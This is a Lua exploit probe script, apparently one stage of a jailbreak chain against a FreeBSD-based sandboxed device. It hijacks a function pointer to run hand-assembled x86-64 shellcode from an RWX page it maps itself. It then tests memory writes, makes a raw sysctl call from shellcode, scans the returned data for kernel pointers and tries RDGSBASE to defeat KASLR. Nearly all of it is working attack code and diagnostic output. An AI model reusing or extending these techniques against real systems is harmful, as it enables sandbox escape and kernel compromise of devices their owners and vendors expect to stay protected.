-- CRASH_CLASS: MODERATE (diagnostic, no new attack surfaces)
-- PROBE 45b: Shellcode memory write diagnostic
--
-- 45a confirmed: native code execution works (ok=true, returns pid).
-- BUT: all memory writes from shellcode to result_buf showed sentinel values.
-- The shellcode's movabs+mov instructions appear to not write to the heap.
--
-- This probe isolates the failure:
--   A) Verify shellcode bytes are correctly written to the code page
--   B) Test self-page write (shellcode writes to its own RWX page)
--   C) Test cross-page write (shellcode writes to heap buffer)
--   D) Test via syscall side effect (sysctl writes to kernel-chosen output)
--   E) If any write works: register dump to understand execution context
--   F) If register dump useful: KASLR via RDGSBASE
--
-- Key changes from 45a:
-- - Writes shellcode via safe_wd (dword packing), not write_byte
-- - Verifies shellcode bytes on page before execution
-- - Tests write_byte independently
-- - Minimal 17-byte shellcode per write test

print("=== PROBE 45b: SHELLCODE WRITE DIAGNOSTIC ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function qw_hex(v)
    if type(v) == "table" and v.h then
        return string.format("%08X_%08X", v.h, v.l)
    end
    return string.format("%08X", to_num(v))
end

local sc_getpid = make_syscall(20)
local sc_mmap = make_syscall(477)
local sc_sysctl = make_syscall(202)
local sc_mtypeprotect = make_syscall(585)

local pid = 0
pcall(function() pid = to_num(sc_getpid()) end)
print("pid: " .. pid)

--------------------------------------------------------------------
-- A) SETUP
--------------------------------------------------------------------
print("")
print("=== A: SETUP ===")

local page_size = 0x4000
local page
pcall(function()
    page = sc_mmap(uint64(0), uint64(page_size), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
if not page then print("FATAL: mmap code page failed"); return end
local h_pg, l_pg = get_hi_lo(page)
print(string.format("code page: %08X_%08X", h_pg, l_pg))

-- Fill code page with INT3 (0xCC) — safe trap if execution goes off-path
for i = 0, page_size/4 - 1 do safe_wd(page + i*4, 0xCCCCCCCC) end

-- Make page RWX
pcall(function() sc_mtypeprotect(uint64(page), uint64(page_size), uint64(7)) end)
print("mtypeprotect(RWX): done")

-- Heap result buffer
local result_buf = memory.alloc(0x100)
for i = 0, 63 do safe_wd(result_buf + i*4, 0xAAAAAAAA) end
local h_rb, l_rb = get_hi_lo(result_buf)
print(string.format("result_buf: %08X_%08X", h_rb, l_rb))

-- fn_addr
local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
if not fn_str then print("FATAL: cannot parse fn_addr"); return end
local fn_ptr = uint64(fn_str)
local fn_orig = safe_rq(fn_ptr)
if not fn_orig then print("FATAL: cannot read fn_addr"); return end
print("fn_addr ptr: " .. fn_str)
print("fn_addr original: " .. qw_hex(fn_orig))

-- Helper: encode uint64 as 8 little-endian bytes
local function addr_to_le(val)
    local h, l = get_hi_lo(val)
    return {
        l % 256, math.floor(l / 256) % 256,
        math.floor(l / 65536) % 256, math.floor(l / 16777216) % 256,
        h % 256, math.floor(h / 256) % 256,
        math.floor(h / 65536) % 256, math.floor(h / 16777216) % 256
    }
end

-- Helper: write byte array to page as packed dwords (proven reliable)
local function write_code(base, offset, bytes)
    local p = {}
    for _, b in ipairs(bytes) do p[#p+1] = b end
    while #p % 4 ~= 0 do p[#p+1] = 0xCC end
    for i = 0, #p/4 - 1 do
        local dw = p[i*4+1] + p[i*4+2]*256 + p[i*4+3]*65536 + p[i*4+4]*16777216
        safe_wd(base + offset + i*4, dw)
    end
    return #p
end

-- Helper: execute shellcode at page+offset, restore fn_addr
local function exec_at(offset)
    safe_wq(fn_ptr, page + offset)
    local ok, ret = pcall(function() return sc_getpid() end)
    safe_wq(fn_ptr, fn_orig)
    return ok, ok and to_num(ret) or -999
end

--------------------------------------------------------------------
-- B) VERIFY WRITE METHODS
--------------------------------------------------------------------
print("")
print("=== B: VERIFY WRITE METHODS ===")

-- B1: Does memory.write_byte exist?
print("memory.write_byte type: " .. type(memory.write_byte))

-- B2: Dword write + readback on code page (baseline)
safe_wd(page + 0x3000, 0xDEADBEEF)
local v_dw = safe_rd(page + 0x3000) or 0
print(string.format("dword write verify: wrote 0xDEADBEEF, read 0x%08X — %s",
    v_dw, v_dw == 0xDEADBEEF and "OK" or "FAIL"))

-- B3: write_byte + readback (page was filled with 0xCC)
-- Write byte 0x41 at page+0x3100, rest stays 0xCC
-- Expected dword: 0xCCCCCC41
pcall(function() memory.write_byte(page + 0x3100, 0x41) end)
local v_wb = safe_rd(page + 0x3100) or 0
print(string.format("write_byte verify: expect 0xCCCCCC41, got 0x%08X — %s",
    v_wb, v_wb == 0xCCCCCC41 and "OK" or "MISMATCH"))

-- B4: Write shellcode via write_code (dword packing)
-- Pattern: 90 90 90 90 C3 CC CC CC (NOP NOP NOP NOP RET INT3 INT3 INT3)
write_code(page, 0x3200, {0x90, 0x90, 0x90, 0x90, 0xC3})
local v_sc = safe_rd(page + 0x3200) or 0
local v_sc2 = safe_rd(page + 0x3204) or 0
print(string.format("write_code verify: expect 0x90909090 0xCCCCCCC3, got 0x%08X 0x%08X — %s",
    v_sc, v_sc2,
    (v_sc == 0x90909090 and v_sc2 == 0xCCCCCCC3) and "OK" or "MISMATCH"))

--------------------------------------------------------------------
-- C) EXECUTION BASELINE
--------------------------------------------------------------------
print("")
print("=== C: EXECUTION BASELINE ===")

-- C1: NOP sled + ret (same as 44a, confirms execution)
write_code(page, 0x100, {0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xC3})
local ok_nop, rv_nop = exec_at(0x100)
print(string.format("NOP+ret: ok=%s ret=%d — %s", tostring(ok_nop), rv_nop,
    ok_nop and "EXECUTION WORKS" or "EXECUTION FAILED"))

--------------------------------------------------------------------
-- D) WRITE TEST 1: SELF-PAGE (shellcode writes to its own RWX page)
--------------------------------------------------------------------
print("")
print("=== D: WRITE TEST 1 — SELF-PAGE ===")

-- Pre-fill target area on code page
safe_wd(page + 0x2000, 0xAAAAAAAA)
safe_wd(page + 0x2004, 0xAAAAAAAA)
print(string.format("pre-fill page+0x2000: 0x%08X", safe_rd(page + 0x2000) or 0))

-- Build shellcode: movabs rax, <page+0x2000>; mov dword [rax], 0xCAFEBABE; ret
-- 48 B8 <8 addr bytes> C7 00 BE BA FE CA C3
local target_self = page + 0x2000
local ab_self = addr_to_le(target_self)
write_code(page, 0x200, {
    0x48, 0xB8, ab_self[1], ab_self[2], ab_self[3], ab_self[4],
                ab_self[5], ab_self[6], ab_self[7], ab_self[8],
    0xC7, 0x00, 0xBE, 0xBA, 0xFE, 0xCA,
    0xC3
})

-- Verify shellcode bytes
local sc_dw0 = safe_rd(page + 0x200) or 0
print(string.format("shellcode dw0: 0x%08X (expect 0x__B848 prefix)", sc_dw0))

-- Execute
local ok_self, rv_self = exec_at(0x200)
print(string.format("exec: ok=%s ret=%d", tostring(ok_self), rv_self))

-- Check target
local v_self = safe_rd(page + 0x2000) or 0
print(string.format("page+0x2000 after: 0x%08X (expect 0xCAFEBABE)", v_self))
if v_self == 0xCAFEBABE then
    print("*** SELF-PAGE WRITE WORKS! ***")
elseif v_self ~= 0xAAAAAAAA then
    print("*** VALUE CHANGED (unexpected value) ***")
else
    print("unchanged — shellcode write to self-page FAILED")
end

--------------------------------------------------------------------
-- E) WRITE TEST 2: HEAP BUFFER (shellcode writes to memory.alloc'd memory)
--------------------------------------------------------------------
print("")
print("=== E: WRITE TEST 2 — HEAP BUFFER ===")

-- Pre-fill
safe_wd(result_buf, 0xBBBBBBBB)
safe_wd(result_buf + 4, 0xBBBBBBBB)
print(string.format("pre-fill result_buf: 0x%08X", safe_rd(result_buf) or 0))

-- Build shellcode: movabs rax, <result_buf>; mov dword [rax], 0xDEADC0DE; ret
local ab_heap = addr_to_le(result_buf)
write_code(page, 0x300, {
    0x48, 0xB8, ab_heap[1], ab_heap[2], ab_heap[3], ab_heap[4],
                ab_heap[5], ab_heap[6], ab_heap[7], ab_heap[8],
    0xC7, 0x00, 0xDE, 0xC0, 0xAD, 0xDE,
    0xC3
})

local ok_heap, rv_heap = exec_at(0x300)
print(string.format("exec: ok=%s ret=%d", tostring(ok_heap), rv_heap))

local v_heap = safe_rd(result_buf) or 0
print(string.format("result_buf after: 0x%08X (expect 0xDEADC0DE)", v_heap))
if v_heap == 0xDEADC0DE then
    print("*** HEAP WRITE WORKS! ***")
elseif v_heap ~= 0xBBBBBBBB then
    print("*** VALUE CHANGED (unexpected value) ***")
else
    print("unchanged — shellcode write to heap FAILED")
end

--------------------------------------------------------------------
-- F) WRITE TEST 3: VIA SYSCALL SIDE EFFECT
-- sysctl writes to an output buffer via KERNEL copyin/copyout.
-- If this works but direct writes fail, it proves shellcode executes
-- but can't directly address user memory (some sandbox protection).
--------------------------------------------------------------------
print("")
print("=== F: WRITE TEST 3 — SYSCTL SIDE EFFECT ===")

-- Prepare sysctl args
local mib_buf = memory.alloc(16)
safe_wd(mib_buf, 1)       -- CTL_KERN
safe_wd(mib_buf + 4, 14)  -- KERN_PROC
safe_wd(mib_buf + 8, 1)   -- KERN_PROC_PID
safe_wd(mib_buf + 12, pid)

local sysctl_out = memory.alloc(0x800)
for i = 0, 511 do safe_wd(sysctl_out + i*4, 0) end
local oldlenp = memory.alloc(8)
safe_wd(oldlenp, 0x800)
safe_wd(oldlenp + 4, 0)

-- Check initial state
local initial_outword = safe_rd(sysctl_out) or 0
local initial_len = safe_rd(oldlenp) or 0
print(string.format("before: sysctl_out[0]=0x%08X, oldlen=%d", initial_outword, initial_len))

-- Build shellcode for direct sysctl call
local ab_mib = addr_to_le(mib_buf)
local ab_out = addr_to_le(sysctl_out)
local ab_olp = addr_to_le(oldlenp)

write_code(page, 0x400, {
    -- movabs rdi, mib_buf
    0x48, 0xBF, ab_mib[1], ab_mib[2], ab_mib[3], ab_mib[4],
                ab_mib[5], ab_mib[6], ab_mib[7], ab_mib[8],
    -- mov esi, 4 (miblen)
    0xBE, 0x04, 0x00, 0x00, 0x00,
    -- movabs rdx, sysctl_out
    0x48, 0xBA, ab_out[1], ab_out[2], ab_out[3], ab_out[4],
                ab_out[5], ab_out[6], ab_out[7], ab_out[8],
    -- movabs r10, oldlenp (syscall ABI: r10 replaces rcx)
    0x49, 0xBA, ab_olp[1], ab_olp[2], ab_olp[3], ab_olp[4],
                ab_olp[5], ab_olp[6], ab_olp[7], ab_olp[8],
    -- xor r8d, r8d (newp = NULL)
    0x45, 0x31, 0xC0,
    -- xor r9d, r9d (newlen = 0)
    0x45, 0x31, 0xC9,
    -- mov eax, 202 (sysctl)
    0xB8, 0xCA, 0x00, 0x00, 0x00,
    -- syscall
    0x0F, 0x05,
    -- ret
    0xC3
})

local ok_sc, rv_sc = exec_at(0x400)
print(string.format("exec: ok=%s ret=%d", tostring(ok_sc), rv_sc))

local after_outword = safe_rd(sysctl_out) or 0
local after_len = safe_rd(oldlenp) or 0
print(string.format("after: sysctl_out[0]=0x%08X, oldlen=%d", after_outword, after_len))

if after_outword ~= 0 or after_len ~= initial_len then
    print("*** SYSCTL FROM SHELLCODE WROTE DATA! ***")
    if after_len > 0 and after_len < 0x800 then
        print(string.format("  kinfo_proc returned %d bytes", after_len))
        -- Scan for kernel pointers
        local found_kptr = false
        for i = 0, math.min(after_len, 0x800) - 8, 8 do
            local lo = safe_rd(sysctl_out + i) or 0
            local hi = safe_rd(sysctl_out + i + 4) or 0
            if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                print(string.format("  *** KPTR at +%03X: %08X_%08X ***", i, hi, lo))
                found_kptr = true
            end
        end
        if not found_kptr then print("  no kernel pointers in output") end
    end
else
    print("no change — sysctl from shellcode also FAILED")
end

--------------------------------------------------------------------
-- G) WRITE TEST 4: KNOWN-WRITABLE ADDRESS
-- fn_ptr is 100% writable (safe_wq works on it). Can shellcode write there?
--------------------------------------------------------------------
print("")
print("=== G: WRITE TEST 4 — FN_PTR ADDRESS ===")

-- Save current fn_orig, we'll write a test pattern and check
-- Use an address near fn_ptr that we can safely trash (fn_ptr + 0x100)
-- Actually, let's use fn_ptr itself since we restore it immediately
local fn_before = safe_rd(fn_ptr) or 0
print(string.format("fn_ptr low dword before: 0x%08X", fn_before))

-- Shellcode: movabs rax, <fn_ptr>; mov dword [rax], 0x12345678; ret
local ab_fn = addr_to_le(fn_ptr)
write_code(page, 0x500, {
    0x48, 0xB8, ab_fn[1], ab_fn[2], ab_fn[3], ab_fn[4],
                ab_fn[5], ab_fn[6], ab_fn[7], ab_fn[8],
    0xC7, 0x00, 0x78, 0x56, 0x34, 0x12,
    0xC3
})

-- Execute (this will temporarily corrupt fn_addr, but we restore after)
safe_wq(fn_ptr, page + 0x500)
local ok_fn, ret_fn = pcall(function() return sc_getpid() end)
-- DO NOT restore fn_addr yet — the shellcode may have written to fn_ptr!

local fn_after = safe_rd(fn_ptr) or 0
print(string.format("fn_ptr low dword after: 0x%08X (expect 0x12345678 if write worked)", fn_after))

-- NOW restore fn_addr
safe_wq(fn_ptr, fn_orig)
local ok_restore = pcall(function() return to_num(sc_getpid()) end)
print(string.format("fn_addr restored, getpid ok=%s", tostring(ok_restore)))

if fn_after == 0x12345678 then
    print("*** SHELLCODE CAN WRITE TO FN_PTR ADDRESS! ***")
elseif fn_after ~= fn_before then
    print(string.format("*** VALUE CHANGED to 0x%08X (not expected) ***", fn_after))
else
    print("unchanged — shellcode cannot write to fn_ptr either")
end

--------------------------------------------------------------------
-- H) ALTERNATIVE: TRY ROP CHAIN RETURN VALUE AS OUTPUT
-- The ROP chain returns a value to Lua. In 44a, mov eax returned pid.
-- Maybe the ROP chain reads the return value from a MEMORY SLOT, not rax.
-- If so, we can find that slot and write to it from shellcode.
--------------------------------------------------------------------
print("")
print("=== H: RETURN VALUE INVESTIGATION ===")

-- Test: what value does a bare RET return?
-- If page+0x600 has just 0xC3 (ret), what does Lua see?
write_code(page, 0x600, {0xC3})
local ok_ret, rv_ret = exec_at(0x600)
print(string.format("bare ret: ok=%s ret=%d (0x%X)", tostring(ok_ret), rv_ret,
    rv_ret >= 0 and rv_ret or 0))

-- Test: xor eax,eax; ret — should return 0 if ROP uses rax
write_code(page, 0x610, {0x31, 0xC0, 0xC3})
local ok_xor, rv_xor = exec_at(0x610)
print(string.format("xor eax,eax; ret: ok=%s ret=%d", tostring(ok_xor), rv_xor))

-- Test: mov eax, 0xBEEF; ret — should return 0xBEEF if ROP uses rax
write_code(page, 0x620, {0xB8, 0xEF, 0xBE, 0x00, 0x00, 0xC3})
local ok_beef, rv_beef = exec_at(0x620)
print(string.format("mov eax,0xBEEF; ret: ok=%s ret=%d (0x%X)", tostring(ok_beef), rv_beef,
    rv_beef >= 0 and rv_beef or 0))

-- Test: mov eax, 0x41414141; ret — from 44a, returned pid
write_code(page, 0x630, {0xB8, 0x41, 0x41, 0x41, 0x41, 0xC3})
local ok_4141, rv_4141 = exec_at(0x630)
print(string.format("mov eax,0x41414141; ret: ok=%s ret=%d (0x%X)", tostring(ok_4141), rv_4141,
    rv_4141 >= 0 and rv_4141 or 0))

if rv_xor == 0 and rv_beef == 0xBEEF then
    print("*** ROP CHAIN USES RAX AS RETURN VALUE! ***")
    print("*** We can use return values as 1-value-at-a-time oracle ***")
elseif rv_xor == rv_beef and rv_beef == rv_4141 then
    print("return value is constant (ROP reads from memory slot, not rax)")
    print(string.format("constant return = %d (0x%X)", rv_ret, rv_ret))
else
    print("return values vary but don't match eax")
    print("ROP chain may modify rax after our code returns")
end

--------------------------------------------------------------------
-- I) IF RETURN VALUE WORKS: USE IT AS ORACLE
-- Read registers one at a time via return value
--------------------------------------------------------------------
print("")
print("=== I: REGISTER ORACLE (via return value) ===")

-- Read rdi low 32 bits: mov eax, edi; ret
write_code(page, 0x700, {0x89, 0xF8, 0xC3})  -- mov eax, edi; ret
local ok_rdi, rv_rdi = exec_at(0x700)
print(string.format("rdi low32: 0x%08X", rv_rdi >= 0 and rv_rdi or 0))

-- Read rsi low 32 bits: mov eax, esi; ret
write_code(page, 0x710, {0x89, 0xF0, 0xC3})  -- mov eax, esi; ret
local ok_rsi, rv_rsi = exec_at(0x710)
print(string.format("rsi low32: 0x%08X", rv_rsi >= 0 and rv_rsi or 0))

-- Read rdx low 32 bits: mov eax, edx; ret
write_code(page, 0x720, {0x89, 0xD0, 0xC3})  -- mov eax, edx; ret
local ok_rdx, rv_rdx = exec_at(0x720)
print(string.format("rdx low32: 0x%08X", rv_rdx >= 0 and rv_rdx or 0))

-- Read rcx low 32 bits: mov eax, ecx; ret
write_code(page, 0x730, {0x89, 0xC8, 0xC3})  -- mov eax, ecx; ret
local ok_rcx, rv_rcx = exec_at(0x730)
print(string.format("rcx low32: 0x%08X", rv_rcx >= 0 and rv_rcx or 0))

-- Read r8 low 32 bits: 44 89 C0 C3 (mov eax, r8d; ret)
write_code(page, 0x740, {0x44, 0x89, 0xC0, 0xC3})
local ok_r8, rv_r8 = exec_at(0x740)
print(string.format("r8  low32: 0x%08X", rv_r8 >= 0 and rv_r8 or 0))

-- Read r9 low 32 bits: 44 89 C8 C3 (mov eax, r9d; ret)
write_code(page, 0x750, {0x44, 0x89, 0xC8, 0xC3})
local ok_r9, rv_r9 = exec_at(0x750)
print(string.format("r9  low32: 0x%08X", rv_r9 >= 0 and rv_r9 or 0))

-- Read rsp low 32 bits: 89 E0 C3 (mov eax, esp; ret)
write_code(page, 0x760, {0x89, 0xE0, 0xC3})
local ok_rsp, rv_rsp = exec_at(0x760)
print(string.format("rsp low32: 0x%08X", rv_rsp >= 0 and rv_rsp or 0))

-- Read rbp low 32 bits: 89 E8 C3 (mov eax, ebp; ret)
write_code(page, 0x770, {0x89, 0xE8, 0xC3})
local ok_rbp, rv_rbp = exec_at(0x770)
print(string.format("rbp low32: 0x%08X", rv_rbp >= 0 and rv_rbp or 0))

-- Read rax low 32 bits before our code: nop; mov ebx, eax; nop; mov eax, ebx; ret
-- (save original rax through ebx before returning it)
write_code(page, 0x780, {0x89, 0xC3, 0x89, 0xD8, 0xC3})  -- mov ebx,eax; mov eax,ebx; ret
local ok_rax, rv_rax = exec_at(0x780)
print(string.format("rax low32: 0x%08X", rv_rax >= 0 and rv_rax or 0))

-- High 32 bits of rdi: shr rdi, 32; mov eax, edi; ret
-- 48 C1 EF 20 89 F8 C3
write_code(page, 0x790, {0x48, 0xC1, 0xEF, 0x20, 0x89, 0xF8, 0xC3})
local ok_rdi_hi, rv_rdi_hi = exec_at(0x790)
print(string.format("rdi hi32: 0x%08X", rv_rdi_hi >= 0 and rv_rdi_hi or 0))

-- High 32 bits of rsp: mov rax, rsp; shr rax, 32; ret
-- 48 89 E0 48 C1 E8 20 C3
write_code(page, 0x7A0, {0x48, 0x89, 0xE0, 0x48, 0xC1, 0xE8, 0x20, 0xC3})
local ok_rsp_hi, rv_rsp_hi = exec_at(0x7A0)
print(string.format("rsp hi32: 0x%08X", rv_rsp_hi >= 0 and rv_rsp_hi or 0))

--------------------------------------------------------------------
-- J) KASLR: RDGSBASE VIA RETURN VALUE
--------------------------------------------------------------------
print("")
print("=== J: RDGSBASE VIA RETURN VALUE ===")

-- RDGSBASE rax; ret  →  F3 0F AE C8 C3
write_code(page, 0x800, {0xF3, 0x0F, 0xAE, 0xC8, 0xC3})
local ok_gs, rv_gs = exec_at(0x800)
print(string.format("RDGSBASE low32: ok=%s ret=0x%08X", tostring(ok_gs), rv_gs >= 0 and rv_gs or 0))

if ok_gs then
    -- Get high 32 bits: rdgsbase rax; shr rax,32; ret
    write_code(page, 0x810, {0xF3, 0x0F, 0xAE, 0xC8, 0x48, 0xC1, 0xE8, 0x20, 0xC3})
    local ok_gs_hi, rv_gs_hi = exec_at(0x810)
    print(string.format("RDGSBASE hi32: ok=%s ret=0x%08X", tostring(ok_gs_hi), rv_gs_hi >= 0 and rv_gs_hi or 0))

    if rv_gs_hi >= 0xFFFF8000 then
        print("*** RDGSBASE RETURNED KERNEL POINTER! ***")
        print(string.format("*** GS BASE = %08X_%08X ***", rv_gs_hi, rv_gs))
        print("*** KASLR DEFEATED — curthread ptr known ***")
    elseif rv_gs ~= 0 or rv_gs_hi ~= 0 then
        print(string.format("GS base = %08X_%08X (not kernel range)", rv_gs_hi, rv_gs))
    else
        print("RDGSBASE returned 0 (FSGSBASE not enabled)")
    end
else
    print("RDGSBASE crashed — FSGSBASE not enabled")
end

-- RDFSBASE rax; ret  →  F3 0F AE C0 C3
write_code(page, 0x820, {0xF3, 0x0F, 0xAE, 0xC0, 0xC3})
local ok_fs, rv_fs = exec_at(0x820)
print(string.format("RDFSBASE low32: ok=%s ret=0x%08X", tostring(ok_fs), rv_fs >= 0 and rv_fs or 0))

if ok_fs then
    write_code(page, 0x830, {0xF3, 0x0F, 0xAE, 0xC0, 0x48, 0xC1, 0xE8, 0x20, 0xC3})
    local ok_fs_hi, rv_fs_hi = exec_at(0x830)
    print(string.format("RDFSBASE hi32: ok=%s ret=0x%08X", tostring(ok_fs_hi), rv_fs_hi >= 0 and rv_fs_hi or 0))
end

--------------------------------------------------------------------
-- K) CLEANUP
--------------------------------------------------------------------
print("")
print("=== K: CLEANUP ===")
safe_wq(fn_ptr, fn_orig)
local ok_final = pcall(function() return to_num(sc_getpid()) end)
print(string.format("fn_addr restored, getpid ok=%s", tostring(ok_final)))

print("")
print("=== PROBE 45b COMPLETE ===")
